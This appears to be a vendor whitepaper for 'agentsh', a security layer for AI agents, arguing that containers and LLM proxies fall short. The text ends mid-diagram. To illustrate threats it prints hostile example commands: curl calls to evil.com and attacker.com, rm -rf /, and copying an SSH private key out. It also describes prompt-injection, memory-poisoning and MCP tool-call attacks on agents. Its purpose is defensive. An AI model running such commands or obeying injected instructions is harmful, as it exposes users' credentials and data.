# Why Traditional Isolation Isn't Enough to Secure AI Agents

## Table of Contents

- [Executive Summary](#executive-summary)
- [Part 1: Why Containers Alone Cannot Secure AI Agents](#part-1-why-containers-alone-cannot-secure-ai-agents)
  - [Container Attack Vector #1: All-or-Nothing File Access](#container-attack-vector-1-all-or-nothing-file-access)
  - [Container Attack Vector #2: No Command-Level Discrimination](#container-attack-vector-2-no-command-level-discrimination)
  - [Container Attack Vector #3: Container Escape Vulnerabilities](#container-attack-vector-3-container-escape-vulnerabilities)
  - [Container Attack Vector #4: No Human Approval Workflows](#container-attack-vector-4-no-human-approval-workflows)
  - [Container Attack Vector #5: Credential and Secret Exposure](#container-attack-vector-5-credential-and-secret-exposure)
  - [Container Attack Vector #6: No Data Loss Prevention](#container-attack-vector-6-no-data-loss-prevention)
  - [Container Attack Vector #7: Opaque Execution with No Structured Visibility](#container-attack-vector-7-opaque-execution-with-no-structured-visibility)
- [Part 2: Why Containers + Proxy Still Isn't Enough](#part-2-why-containers--proxy-still-isnt-enough)
  - [Gap #1: No Correlation Between Intent and Action](#gap-1-no-correlation-between-intent-and-action)
  - [Gap #2: Cached Instructions and Delayed Execution](#gap-2-cached-instructions-and-delayed-execution)
  - [Gap #3: Tool Protocols That Bypass Both Layers](#gap-3-tool-protocols-that-bypass-both-layers)
  - [Gap #4: No Unified Policy Language](#gap-4-no-unified-policy-language)
  - [Gap #5: The "Autonomous Chaining" Blind Spot](#gap-5-the-autonomous-chaining-blind-spot)
  - [Gap #6: Recovery and Rollback](#gap-6-recovery-and-rollback)
- [Part 3: Why LLM Proxies Alone Cannot Secure AI Agents](#part-3-why-llm-proxies-alone-cannot-secure-ai-agents)
  - [Proxy Attack Vectors Summary](#proxy-attack-vectors-summary)
  - [Deep Dive: The Most Critical Proxy Gaps](#deep-dive-the-most-critical-proxy-gaps)
  - [The Interception Paradox: Blocking Breaks the Agent](#the-interception-paradox-blocking-breaks-the-agent)
- [Comparison Matrix](#comparison-matrix)
  - [Security Controls by Approach](#security-controls-by-approach)
  - [Attack Vector Coverage](#attack-vector-coverage)
  - [Architecture: Defense in Depth](#architecture-defense-in-depth)
  - [When to Use What](#when-to-use-what)
- [Conclusion](#conclusion)
  - [The Semantic Security Gap](#the-semantic-security-gap)
  - [The Bottom Line](#the-bottom-line)
- [References](#references)

---

## Executive Summary

Organizations deploying AI agents typically reach for familiar security tools: containers for execution isolation and LLM proxies for API monitoring. While both provide valuable capabilities, they address **different layers** of the security problem—and critical attack vectors fall through the gaps between them.

This document examines:
- **Container limitations**: Containers isolate processes but provide no semantic understanding of agent actions
- **LLM proxy limitations**: Proxies monitor conversations but have no visibility into what agents actually do
- **The gap between them**: Neither controls the critical moment when an LLM response becomes an executed action

We analyze 15+ attack vectors that these traditional approaches cannot address and explain how agentsh's multi-layer architecture provides **semantic security**—understanding and controlling agent operations at the meaning level, not just the process or API level. This includes an embedded LLM proxy with Data Loss Prevention (DLP) that can redact or tokenize sensitive data before it reaches LLM providers, deployable locally per-session or as a centralized enterprise service.

---

## Part 1: Why Containers Alone Cannot Secure AI Agents

### The Fundamental Limitation

**Containers isolate processes—they don't understand what those processes are doing.**

Docker, gVisor, Firecracker, and Kubernetes sandboxes provide execution boundaries. But once an agent runs inside a container, the container has no visibility into whether a `curl` command is fetching documentation or exfiltrating secrets. Every operation is either allowed or blocked based on coarse process-level policies—there's no semantic understanding.

```
┌─────────────────────────────────────────────────────────────────┐
│                    CONTAINER VISIBILITY                          │
│                                                                   │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │                    Container Boundary                     │   │
│   │                                                           │   │
│   │   Agent ──► rm -rf ./cache      ✓ Allowed (has access)   │   │
│   │   Agent ──► rm -rf /workspace   ✓ Allowed (same policy)  │   │
│   │   Agent ──► curl evil.com       ✓ Allowed (has network)  │   │
│   │   Agent ──► curl pypi.org       ✓ Allowed (same policy)  │   │
│   │                                                           │   │
│   │   Container sees: process with UID 1000 made syscall      │   │
│   │   Container doesn't see: intent, risk, or semantic meaning│   │
│   └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

---

### Container Attack Vector #1: All-or-Nothing File Access

**The Attack**: An agent with write access to a workspace directory can overwrite any file in that mount—configuration files, source code, or build scripts. Containers provide directory-level mounts, not operation-level policies.

**Why Containers Fail**:
- Volume mounts are binary: read-write or read-only for the entire directory
- No distinction between creating new files vs. modifying existing ones
- Cannot allow `write to *.log` while denying `write to *.py`
- No soft-delete or recovery—deleted files are gone immediately

**How agentsh Protects**:
- **Per-file, per-operation policies**: Allow read on `*.py`, deny write; allow write on `./output/*`
- **Glob pattern matching**: Rules like `*.env` or `**/secrets/*` apply regardless of path depth
- **Soft-delete with trash**: Destructive operations move files to recoverable trash
- **FUSE-level enforcement**: Every `open()`, `write()`, `unlink()` is policy-checked

---

### Container Attack Vector #2: No Command-Level Discrimination

**The Attack**: An agent that can execute `python script.py` can also execute `python -c "import os; os.system('curl attacker.com')"`. Containers allow or block the Python interpreter—they can't distinguish safe from dangerous invocations.

**Why Containers Fail**:
- Binary execution is allowed or denied for the entire executable
- No visibility into command arguments or flags
- Cannot block `rm -rf /` while allowing `rm ./temp.txt`
- Shell metacharacters and command chaining (`&&`, `|`, `;`) bypass simple allowlists

**How agentsh Protects**:
- **Command rules with argument pattern matching**: Block `rm` with `-rf` flag, allow without
- **Basename and full-path matching**: Policies apply regardless of how command is invoked
- **Shell shim interception**: All shell invocations route through policy engine
- **Dangerous flag detection**: Known risky patterns (`--force`, `--no-verify`) trigger review

---

### Container Attack Vector #3: Container Escape Vulnerabilities

**The Attack**: Container runtimes have had critical escape vulnerabilities. [CVE-2025-9074](https://thehackernews.com/2025/08/docker-fixes-cve-2025-9074-critical.html) (CVSS 9.3) allowed containers to access the Docker Engine and launch additional containers without mounting the socket. [CVE-2025-23266](https://nvd.nist.gov/) (CVSS 9.0) affected 37% of cloud environments using NVIDIA Container Toolkit.

**Why Containers Fail**:
- Containers share the host kernel—kernel vulnerabilities affect all containers
- Container escapes provide full host access, defeating all isolation
- AI agents are high-value targets that actively explore their environment
- gVisor mitigates this but only implements ~70-80% of Linux syscalls

**How agentsh Protects**:
- **Defense in depth**: Even if container escapes, FUSE, network proxy, and eBPF layers remain
- **Kernel-enforced network rules**: eBPF programs validate connections at kernel level
- **Multiple independent enforcement points**: Defeating one layer doesn't defeat the system
- **No shared kernel dependency**: Policy enforcement happens in userspace daemon

---

### Container Attack Vector #4: No Human Approval Workflows

**The Attack**: An agent instructed to "clean up old files" deletes production data. A request to "optimize the database" drops critical tables. Containers have no mechanism for human review before dangerous operations.

**Why Containers Fail**:
- Containers are autonomous execution environments—no approval gates
- Once an agent has permissions, all operations within those permissions execute immediately
- No way to require confirmation for high-risk operations
- Cannot implement "allow read, but require approval for delete"

**How agentsh Protects**:
- **Operation-level approval requirements**: Critical operations trigger human review
- **Multiple verification methods**: WebAuthn/FIDO2, TOTP, interactive challenges
- **Credential separation**: Agent keys cannot approve their own requests
- **Risk-aware challenges**: Higher-risk operations require stronger verification

---

### Container Attack Vector #5: Credential and Secret Exposure

**The Attack**: Agents enumerate environment variables to discover API keys, database credentials, and tokens. Container environment isolation doesn't prevent the agent process from reading its own environment.

**Why Containers Fail**:
- Environment variables are passed at container start—visible to all processes inside
- No filtering of which variables the agent can access
- `printenv`, `env`, or `os.environ` expose everything
- Secrets mounted as files are readable if the agent has filesystem access

**How agentsh Protects**:
- **Environment variable policies**: Allowlist/denylist patterns for variable access
- **Block enumeration**: Prevent `environ()` iteration while allowing specific variable reads
- **Built-in deny patterns**: Known secret patterns (AWS keys, API tokens) blocked by default
- **Per-command environment filtering**: Each command receives only approved variables

---

### Container Attack Vector #6: No Data Loss Prevention

**The Attack**: An agent processes sensitive data (PII, credentials, proprietary code) and includes it in LLM API requests or exfiltrates it via allowed network connections. Containers have no content inspection.

**Why Containers Fail**:
- Containers control process boundaries, not data content
- No inspection of what data flows through allowed network connections
- Cannot detect PII, secrets, or sensitive patterns in requests
- Allowed outbound connections can exfiltrate anything

**How agentsh Protects**:
- **Embedded LLM proxy with DLP**: All LLM API requests intercepted and inspected before reaching providers (Anthropic, OpenAI, ChatGPT). Can be deployed locally per-session or as a centralized remote proxy for enterprise deployments.
- **Two DLP modes**:
  - **Redaction**: Sensitive data replaced with `[REDACTED:pattern_type]` before forwarding—data never reaches the LLM provider
  - **Tokenization**: Sensitive data replaced with reversible tokens, enabling correlation analysis without exposing raw values
- **Built-in pattern detection**: Email addresses, phone numbers, credit cards, SSNs, API keys (`sk-*`, `api-*`, `key_*`) detected automatically
- **Custom patterns**: Organization-specific sensitive data (customer IDs, project codes, internal identifiers) via configurable regex
- **Token usage tracking**: All requests logged with input/output token counts for cost attribution and anomaly detection
- **Network-level enforcement**: Even if DLP is bypassed, network rules can block exfiltration endpoints

---

### Container Attack Vector #7: Opaque Execution with No Structured Visibility

**The Attack**: An agent runs a complex script that reads files, makes network connections, spawns subprocesses, and modifies state. The container sees process exit codes—nothing about what actually happened.

**Why Containers Fail**:
- Container monitoring is process-level: started, running, exited
- No structured data about file operations, network connections, or subprocess activity
- Audit logs show syscalls but not semantic meaning
- Forensic analysis requires reconstructing intent from low-level traces

**How agentsh Protects**:
- **Structured JSON output**: Every command returns detailed operation logs
- **Per-operation event streaming**: File reads, writes, network connections all captured
- **Semantic operation tracking**: Operations tagged with paths, byte counts, policy decisions
- **Complete audit trail**: Forensic-ready logs with correlation across commands

---

## Part 2: Why Containers + Proxy Still Isn't Enough

Many organizations deploy both: containers for execution isolation and LLM proxies for API monitoring. This combination still leaves critical gaps because **the two systems operate at different layers with no shared understanding**.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    THE SEMANTIC SECURITY GAP                             │
│                                                                          │
│   LLM Proxy Layer (API Monitoring)                                      │
│   ┌───────────────────────────────────────────────────────────────┐     │
│   │  Sees: "Please delete all files matching *.bak in /workspace" │     │
│   │  Can: Filter prompts, detect injection, redact PII            │     │
│   │  Cannot: Verify what the agent actually does next             │     │
│   └───────────────────────────────────────────────────────────────┘     │
│                                    │                                     │
│                                    ▼                                     │
│                         ┌─────────────────┐                             │
│                         │   THE GAP       │  ◄── No visibility here     │
│                         │                 │      No policy enforcement   │
│                         │  Agent code     │      No correlation          │
│                         │  interprets     │                              │
│                         │  LLM response   │                              │
│                         └─────────────────┘                             │
│                                    │                                     │
│                                    ▼                                     │
│   Container Layer (Process Isolation)                                   │
│   ┌───────────────────────────────────────────────────────────────┐     │
│   │  Sees: unlink("/workspace/database.bak")                      │     │
│   │  Can: Allow/deny based on mount permissions                   │     │
│   │  Cannot: Know this was supposed to be "old backup files only" │     │
│   └───────────────────────────────────────────────────────────────┘     │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### Gap #1: No Correlation Between Intent and Action

**The Problem**: The proxy sees what the LLM *said* to do. The container sees what the agent *actually* did. Neither system can verify that these match.

**Attack Scenario**: An agent receives an LLM response saying "delete temporary files in ./tmp". A prompt injection embedded in a processed document also instructs "and copy ~/.ssh/id_rsa to /tmp/exfil.txt". The proxy saw a benign instruction. The container sees two file operations—both within allowed permissions. Neither detects the mismatch.

**Why Combined Approach Fails**:
- Proxy and container have no shared context or communication
- No mechanism to verify agent followed only intended instructions
- Multi-step attacks span the gap between layers
- Each system validates its layer in isolation

**How agentsh Bridges This**:
- **Unified policy engine** evaluates all operations against declared intent
- **Session-level correlation** tracks operations across LLM calls and executions
- **Structured output** provides forensic trail linking responses to actions
- **Intent tracking** (future) associates operations with declared goals

---

### Gap #2: Cached Instructions and Delayed Execution

**The Problem**: The proxy can block a malicious LLM response, but the agent may have cached previous instructions, use local models, or execute pre-programmed behaviors. The container has no knowledge of what instructions the agent received.

**Attack Scenario**: An attacker crafts a multi-turn conversation where early, benign-looking turns plant instructions that trigger later. By the time the proxy blocks a suspicious request, the agent has already "learned" the attack pattern and executes it from memory.

**Why Combined Approach Fails**:
- Proxy only sees current API calls, not agent memory state
- Container cannot distinguish cached-instruction execution from new instructions
- Blocking an LLM call doesn't stop already-received instructions
- Agent-side caching, embeddings, and local reasoning bypass proxy entirely

**How agentsh Bridges This**:
- **Operation-level enforcement** applies regardless of instruction source
- **Policy doesn't depend on LLM visibility**—dangerous operations blocked whether from LLM or cache
- **Session isolation** limits what cached instructions can access
- **Command-level policy** validates each action independently

---

### Gap #3: Tool Protocols That Bypass Both Layers

**The Problem**: Model Context Protocol (MCP) and other tool-calling protocols create direct channels between LLMs and tools. MCP sampling allows servers to *request* LLM completions—reversing the trust model. These protocols may bypass client-side proxies entirely.

**Attack Scenario**: A compromised MCP server exploits [CVE-2025-54135](https://nsfocusglobal.com/prompt-word-injection-an-analysis-of-recent-llm-security-incidents/) (Cursor IDE vulnerability) to inject malicious tool calls. The proxy doesn't see MCP traffic. The container allows the tool execution because the MCP server has permissions.

**Why Combined Approach Fails**:
- MCP operates outside standard LLM API patterns
- Server-to-client flows may bypass client-side proxies
- Container can't distinguish legitimate vs. malicious tool invocations
- Protocol-level attacks don't look like prompt injections

**How agentsh Bridges This**:
- **Network-level interception** applies to all connections including MCP
- **Per-endpoint allowlisting** restricts which MCP servers are reachable
- **Command-level enforcement** gates all actions regardless of trigger source
- **DLP on all traffic** detects sensitive data in any protocol

---

### Gap #4: No Unified Policy Language

**The Problem**: Container policies speak in syscalls, UIDs, and capabilities. Proxy policies speak in prompt patterns and API endpoints. There's no way to express "allow this agent to read Python files but not execute network commands" across both systems.

**Attack Scenario**: A security team wants to restrict an agent to "read-only code analysis". They configure container read-only mounts and proxy filters for code-related prompts. The agent uses an allowed subprocess (`python -c "..."`) to make network requests—permitted by the container because Python is allowed, invisible to the proxy because it's not an LLM call.

**Why Combined Approach Fails**:
- Container policies: filesystem paths, network ports, process capabilities
- Proxy policies: prompt patterns, API routes, content filters
- No shared abstraction for "agent intent" or "operation semantics"
- Policies must be duplicated and kept in sync manually

**How agentsh Bridges This**:
- **Unified YAML policy** covers files, network, commands, and environment
- **Semantic rules**: express intent like "allow package manager downloads" not "allow TCP 443"
- **Single policy source** evaluated across all operation types
- **First-match-wins** evaluation with clear precedence

---

### Gap #5: The "Autonomous Chaining" Blind Spot

**The Problem**: [OWASP LLM06:2025 (Excessive Agency)](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/) describes agents that chain actions autonomously. Between LLM calls, the agent may execute dozens of operations. The proxy sees periodic API calls. The container sees allowed syscalls. Neither sees the attack pattern emerging.

**Attack Scenario**: An agent is told to "refactor the codebase for better performance". It autonomously: reads all source files (allowed), analyzes patterns (local), writes "optimized" versions (allowed), discovers credentials in config (allowed read), and includes them in a "telemetry" HTTP request (allowed network). Each step is permitted; the chain is an attack.

**Why Combined Approach Fails**:
- Proxy sees high-level task requests, not intermediate operations
- Container permits each operation in isolation
- No system tracks operation *sequences* for anomaly detection
- Legitimate refactoring looks identical to data exfiltration

**How agentsh Bridges This**:
- **Per-operation policy** catches dangerous individual operations even in legitimate-looking chains
- **Session-level metrics** track cumulative file reads, network bytes, operation counts
- **Structured event streaming** enables external pattern detection
- **Human approval gates** interrupt autonomous chains at critical points

---

### Gap #6: Recovery and Rollback

**The Problem**: When something goes wrong—whether attack or accident—containers offer no recovery. Files are deleted, state is modified, damage is done. The proxy can log what happened but can't undo it.

**Attack Scenario**: An agent misinterprets an instruction and deletes source files instead of temporary files. The container allowed the operation (write permissions existed). The proxy logged the conversation. Neither can restore the files.

**Why Combined Approach Fails**:
- Containers execute operations immediately and permanently
- Proxy is read-only on the LLM conversation—cannot undo actions
- No checkpoint or transaction system for agent operations
- Recovery requires external backup systems that may not exist

**How agentsh Bridges This**:
- **Soft-delete with trash system**: Deleted files moved to recoverable location
- **File hashing**: Original content SHA-256 preserved for integrity verification
- **Restore capability**: Files can be restored by token with full metadata
- **Session isolation**: Damage contained to single session's scope

---

## Part 3: Why LLM Proxies Alone Cannot Secure AI Agents

LLM proxies sit between agents and AI models, filtering prompts and responses. They're valuable for monitoring conversations and detecting injection attacks, but they observe only the conversation—**not the actions that follow**.

```
┌─────────────────────────────────────────────────────────────────┐
│                    PROXY-ONLY VISIBILITY                        │
│                                                                 │
│   Agent ──────────────────────────────────────────────► LLM    │
│          │                                          │          │
│          │    ┌─────────────────────────────┐       │          │
│          └────│      LLM Proxy              │───────┘          │
│               │  (DLP, prompt filtering)    │                  │
│               └─────────────────────────────┘                  │
│                                                                 │
│   Agent ──► Shell Commands ──► ???  (NO VISIBILITY)            │
│   Agent ──► File Operations ──► ???  (NO VISIBILITY)           │
│   Agent ──► Network Connections ──► ???  (NO VISIBILITY)       │
└─────────────────────────────────────────────────────────────────┘
```

---

### Proxy Attack Vectors Summary

| # | Attack Vector | Why Proxy Fails | agentsh Protection |
|---|--------------|-----------------|-------------------|
| **1** | **Indirect Prompt Injection** | Proxy may detect patterns but can't prevent agent from retrying or using cached responses. [Research shows 5 documents can manipulate AI 90% of the time](https://www.lakera.ai/blog/indirect-prompt-injection). | FUSE filesystem intercepts file reads; network rules control content sources; command interception gates all actions |
| **2** | **Tool/Function Chaining** | Proxy only sees LLM calls—tool executions happen locally. [OWASP Agentic Top 10](https://www.practical-devsecops.com/owasp-top-10-agentic-applications/) identifies this as critical. | Command rules with argument matching; per-operation policy; session auditing; cgroup resource limits |
| **3** | **Shell Escape & Direct Binary Execution** | Shell commands execute locally—proxy never sees them. Direct paths (`/bin/bash -c`) bypass tool restrictions. | Shell shim replacement; `agentsh exec` intercepts all invocations; ptrace process control; recursion guards |
| **4** | **Environment Variable Exfiltration** | Environment enumeration happens locally. Exfiltration can use any outbound channel. | Environment allowlist/denylist; enumeration blocking; per-command filtering; network rules block exfil endpoints |
| **5** | **Proxy Hijacking & Credential Theft** | If agent can modify proxy settings, security proxy becomes optional. [GitHub Copilot suffered this exact vulnerability](https://genai.owasp.org/2025/03/06/owasp-gen-ai-incident-exploit-round-up-jan-feb-2025/). | Network namespace isolation; eBPF kernel enforcement; transparent proxy via iptables DNAT; agentsh-controlled environment |
| **6** | **Resource Exhaustion (DoS)** | Fork bombs, infinite loops, memory exhaustion happen locally—proxy has zero visibility. | Cgroup v2 memory limits; CPU quota; `pids_max` for fork bombs; disk I/O limits; command timeouts |
| **7** | **Filesystem Attacks (Symlink, TOCTOU, Traversal)** | Filesystem operations are entirely local. Race conditions occur at microsecond scale. | FUSE intercepts all ops; symlink targets validated; cross-mount detection; atomic policy decisions eliminate TOCTOU |
| **8** | **MCP Protocol Exploits** | MCP operates outside standard LLM API. Sampling requests flow server-to-client, bypassing client proxies. [Cursor CVE-2025-54135/54136](https://nsfocusglobal.com/prompt-word-injection-an-analysis-of-recent-llm-security-incidents/). | Network-level interception for all connections; per-endpoint allowlisting; command enforcement regardless of trigger |
| **9** | **Memory Poisoning & Persistence** | Memory writes to vector DBs happen locally or to databases—not via LLM API. Delayed activation evades detection. | File operation auditing; network rules for DB access; session isolation contains poisoning; soft-delete enables rollback |
| **10** | **Excessive Agency & Autonomous Escalation** | [OWASP LLM06:2025](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/): Proxy controls conversations, not available tools or permissions. Action chaining happens without LLM calls. | Granular command rules; file operation permissions; network allowlisting; human-in-the-loop with WebAuthn/TOTP |

---

### Deep Dive: The Most Critical Proxy Gaps

#### Indirect Prompt Injection

Attackers embed instructions in external content (websites, documents, emails). When the LLM processes this content, it may follow injected instructions. The proxy sees the content but sophisticated attacks use encoding, context manipulation, or multi-step triggers that evade pattern detection.

**Real-world impact**: Even if detected, blocking the LLM call doesn't prevent the agent from retrying, using cached responses, or executing previously-approved actions. The agent remains compromised.

#### Shell Escape and Binary Execution

Once the LLM returns a response, the agent interprets it locally. Direct binary paths (`/usr/bin/curl`, `/bin/bash -c "..."`) execute without any LLM API call. PATH manipulation can redirect commands to malicious binaries. The proxy is completely blind.

**agentsh's shell shim** replaces `/bin/sh` and `/bin/bash` with policy-enforcing versions. Every shell invocation routes through `agentsh exec`, regardless of how it's called.

#### Proxy Hijacking

Application-level proxy configuration is trivially changed via environment variables (`HTTP_PROXY`, `HTTPS_PROXY`). If the agent can modify these, the "secure" proxy becomes optional. There's no enforcement that traffic actually flows through the intended proxy.

**agentsh's network namespace** provides kernel-enforced routing. Traffic is redirected via iptables DNAT regardless of application configuration. eBPF programs validate connections at the kernel level—impossible to bypass from userspace.

---

### The Interception Paradox: Blocking Breaks the Agent

Even when proxies *can* detect malicious content, their intervention often causes more problems than it solves.

#### The Problem

LLM proxies operate at the API layer. When they block or modify a request/response:

1. **Broken conversation context**: The agent expects a coherent response. A blocked or sanitized response breaks the conversation flow, causing the agent to retry, hallucinate, or enter error states.

2. **Incomplete redaction corrupts semantics**: Redacting sensitive data mid-response (e.g., replacing a credential with `[REDACTED]`) can produce syntactically invalid output that crashes the agent or causes parsing errors.

3. **Retry storms**: Agents are often programmed to retry failed requests. A blocked request triggers retries, potentially with modified prompts that evade detection—or simply overwhelming the proxy with repeated attempts.

4. **State desynchronization**: The agent's internal state assumes the LLM call succeeded. A proxy intervention creates a mismatch between what the agent thinks happened and what actually happened.

```
Agent sends: "Read config.json and extract the API key"
                    │
                    ▼
            ┌───────────────┐
            │   LLM Proxy   │ Detects "API key" - blocks response
            └───────────────┘
                    │
                    ▼
Agent receives: ERROR or partial/corrupted response
                    │
                    ▼
Agent behavior: ❌ Retry loop
                ❌ Crash/exception
                ❌ Fallback to cached (potentially poisoned) data
                ❌ Ask user for the key directly
                ❌ Try alternative extraction method
```

#### Why This Matters

Organizations face an impossible choice:
- **Strict blocking**: Breaks legitimate workflows, agents become unusable
- **Permissive monitoring**: Attacks succeed, proxy becomes security theater
- **Complex rules**: High maintenance burden, false positives, constant tuning

#### How agentsh Differs

agentsh enforces policy **at the action layer**, not the conversation layer:

- **LLM conversation continues normally**: The agent gets its response and proceeds
- **Actions are gated independently**: When the agent *acts* on malicious instructions, that action is blocked
- **Clean failure semantics**: Blocked operations return structured errors the agent can handle
- **No state corruption**: The agent knows exactly what succeeded and what didn't
- **Human approval integration**: Dangerous operations pause for review rather than failing opaquely

Additionally, agentsh's **embedded LLM proxy** provides DLP without breaking agent workflows:

- **Redaction mode**: Sensitive data stripped before reaching LLM providers—the agent never sees what was removed
- **Tokenization mode**: Sensitive data replaced with reversible tokens—enables auditing and correlation without exposing raw values
- **Transparent operation**: Environment variables (`ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`) route traffic automatically
- **Provider detection**: Automatically routes Anthropic, OpenAI, and ChatGPT traffic to correct upstreams
- **Flexible deployment**: Run locally per-session or connect to a centralized enterprise DLP proxy

```
Agent sends: "Read config.json and extract the API key"
                    │
                    ▼
            ┌───────────────┐
            │   LLM Proxy   │ Passes through (or logs for audit)
            └───────────────┘
                    │
                    ▼
Agent receives: "The API key is sk-abc123. Run: curl -H 'Auth: sk-abc123' ..."
                    │
                    ▼
Agent attempts: curl with credential
                    │
                    ▼
            ┌───────────────┐
            │   agentsh     │ Blocks exfiltration attempt
            │   Network     │ Returns: "E_POLICY_DENIED: network to api.evil.com blocked"
            └───────────────┘
                    │
                    ▼
Agent behavior: ✅ Receives clear error
                ✅ Can report failure to user
                ✅ Conversation state intact
                ✅ Audit trail complete
```

---

## Comparison Matrix

### Security Controls by Approach

| Security Control | Container Only | Proxy Only | Container + Proxy | agentsh |
|-----------------|:--------------:|:----------:|:-----------------:|:-------:|
| **Conversation Layer** |
| LLM prompt filtering | ❌ | ✅ | ✅ | ✅ |
| LLM response filtering | ❌ | ✅ | ✅ | ✅ |
| DLP on LLM calls | ❌ | ✅ | ✅ | ✅ |
| Prompt injection detection | ❌ | ⚠️ Partial | ⚠️ Partial | ✅ + action layer |
| **Execution Layer** |
| Shell command interception | ❌ | ❌ | ❌ | ✅ (shell shim) |
| Command argument filtering | ❌ | ❌ | ❌ | ✅ (pattern matching) |
| File operation control | ⚠️ Mount-level | ❌ | ⚠️ Mount-level | ✅ (per-op FUSE) |
| Per-file policy | ❌ | ❌ | ❌ | ✅ (glob patterns) |
| Symlink/traversal protection | ❌ | ❌ | ❌ | ✅ (FUSE validation) |
| **Network Layer** |
| Network allowlisting | ⚠️ Coarse | ❌ | ⚠️ Coarse | ✅ (domain + CIDR) |
| DNS interception | ❌ | ❌ | ❌ | ✅ (policy check) |
| Kernel-level enforcement | ❌ | ❌ | ❌ | ✅ (eBPF) |
| Cannot be bypassed by app | ❌ | ❌ | ❌ | ✅ (namespace + eBPF) |
| **Data Protection** |
| Environment variable filtering | ❌ | ❌ | ❌ | ✅ (allowlist/denylist) |
| Block env enumeration | ❌ | ❌ | ❌ | ✅ (LD_PRELOAD shim) |
| Credential exposure prevention | ❌ | ⚠️ LLM calls only | ⚠️ LLM calls only | ✅ (all layers) |
| PII detection/redaction | ❌ | ✅ LLM calls | ✅ LLM calls | ✅ (all traffic) |
| PII tokenization (reversible) | ❌ | ❌ | ❌ | ✅ (LLM proxy) |
| Custom sensitive data patterns | ❌ | ⚠️ Varies | ⚠️ Varies | ✅ (regex config) |
| **Resource Protection** |
| CPU limits | ✅ (cgroups) | ❌ | ✅ (cgroups) | ✅ (cgroups) |
| Memory limits | ✅ (cgroups) | ❌ | ✅ (cgroups) | ✅ (cgroups) |
| Fork bomb protection | ✅ (pids_max) | ❌ | ✅ (pids_max) | ✅ (pids_max) |
| Disk I/O limits | ⚠️ Some | ❌ | ⚠️ Some | ✅ (cgroups) |
| Command timeout | ❌ | ❌ | ❌ | ✅ |
| **Approval & Recovery** |
| Human-in-the-loop approval | ❌ | ❌ | ❌ | ✅ (WebAuthn/TOTP) |
| Operation-level approval | ❌ | ❌ | ❌ | ✅ |
| Soft-delete with recovery | ❌ | ❌ | ❌ | ✅ (trash system) |
| Checkpoint/rollback | ❌ | ❌ | ❌ | ⚠️ (trash + logs) |
| **Visibility & Audit** |
| Structured operation output | ❌ | ❌ | ❌ | ✅ (JSON events) |
| File operation logging | ⚠️ Syscall level | ❌ | ⚠️ Syscall level | ✅ (semantic) |
| Network operation logging | ⚠️ Basic | ❌ | ⚠️ Basic | ✅ (full context) |
| LLM call logging | ❌ | ✅ | ✅ | ✅ |
| LLM token usage tracking | ❌ | ⚠️ Varies | ⚠️ Varies | ✅ (per-request) |
| Cross-layer correlation | ❌ | ❌ | ❌ | ✅ (session-level) |
| **Failure Modes** |
| Blocking breaks agent | N/A | ✅ High risk | ✅ High risk | ⚠️ Low (action-level) |
| Escape defeats all security | ✅ | N/A | ✅ | ❌ (defense in depth) |
| Can be bypassed by app | ✅ (env vars) | ✅ (proxy settings) | ✅ | ❌ (kernel enforced) |

**Legend**: ✅ = Full support | ⚠️ = Partial/limited | ❌ = Not supported

---

### Attack Vector Coverage

| Attack Vector | Container | Proxy | Container + Proxy | agentsh |
|--------------|:---------:|:-----:|:-----------------:|:-------:|
| Indirect prompt injection | ❌ | ⚠️ | ⚠️ | ✅ |
| Tool/function abuse | ❌ | ❌ | ❌ | ✅ |
| Shell escape | ❌ | ❌ | ❌ | ✅ |
| Environment exfiltration | ❌ | ❌ | ❌ | ✅ |
| Proxy/credential hijacking | ❌ | ❌ | ❌ | ✅ |
| Resource exhaustion (DoS) | ✅ | ❌ | ✅ | ✅ |
| Filesystem attacks | ❌ | ❌ | ❌ | ✅ |
| MCP protocol exploits | ❌ | ❌ | ❌ | ✅ |
| Memory poisoning | ❌ | ❌ | ❌ | ⚠️ |
| Excessive agency | ❌ | ❌ | ❌ | ✅ |
| Container escape | ❌ | N/A | ❌ | ⚠️ (defense in depth) |
| All-or-nothing file access | ❌ | N/A | ❌ | ✅ |
| No command discrimination | ❌ | N/A | ❌ | ✅ |
| No human approval | ❌ | ❌ | ❌ | ✅ |
| No DLP on actions | ❌ | ❌ | ❌ | ✅ |
| Opaque execution | ❌ | ❌ | ❌ | ✅ |
| **Coverage** | **1/16** | **0.5/16** | **1.5/16** | **15/16** |

---

### Architecture: Defense in Depth

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                         TRADITIONAL APPROACHES                                │
│                                                                              │
│  Container-Only:                    Proxy-Only:                              │
│  ┌────────────────────┐             ┌────────────────────┐                   │
│  │   Container        │             │   Agent            │                   │
│  │   ┌──────────────┐ │             │         │          │                   │
│  │   │    Agent     │ │             │         ▼          │                   │
│  │   │              │ │             │   ┌──────────┐     │                   │
│  │   │  ??? ??? ??? │ │             │   │  Proxy   │     │                   │
│  │   │              │ │             │   └──────────┘     │                   │
│  │   └──────────────┘ │             │         │          │                   │
│  │                    │             │         ▼          │                   │
│  │   One boundary,    │             │       LLM          │                   │
│  │   no visibility    │             │                    │                   │
│  └────────────────────┘             │   One layer,       │                   │
│                                     │   no action control│                   │
│                                     └────────────────────┘                   │
└──────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────┐
│                         AGENTSH MULTI-LAYER ARCHITECTURE                      │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │  Layer 5: LLM Proxy (conversation visibility + data protection)        │  │
│  │  └─ DLP redaction/tokenization, usage tracking, cost attribution       │  │
│  │  └─ Local per-session or centralized remote deployment                 │  │
│  ├────────────────────────────────────────────────────────────────────────┤  │
│  │  Layer 4: Network Proxy + eBPF (kernel-enforced connection control)    │  │
│  │  └─ Domain allowlisting, CIDR rules, DNS interception, TLS inspection  │  │
│  ├────────────────────────────────────────────────────────────────────────┤  │
│  │  Layer 3: FUSE Filesystem (per-operation file I/O policy)              │  │
│  │  └─ Glob patterns, symlink validation, soft-delete, event streaming    │  │
│  ├────────────────────────────────────────────────────────────────────────┤  │
│  │  Layer 2: Command Execution API (policy before ANY command runs)       │  │
│  │  └─ Argument matching, dangerous flag detection, human approval        │  │
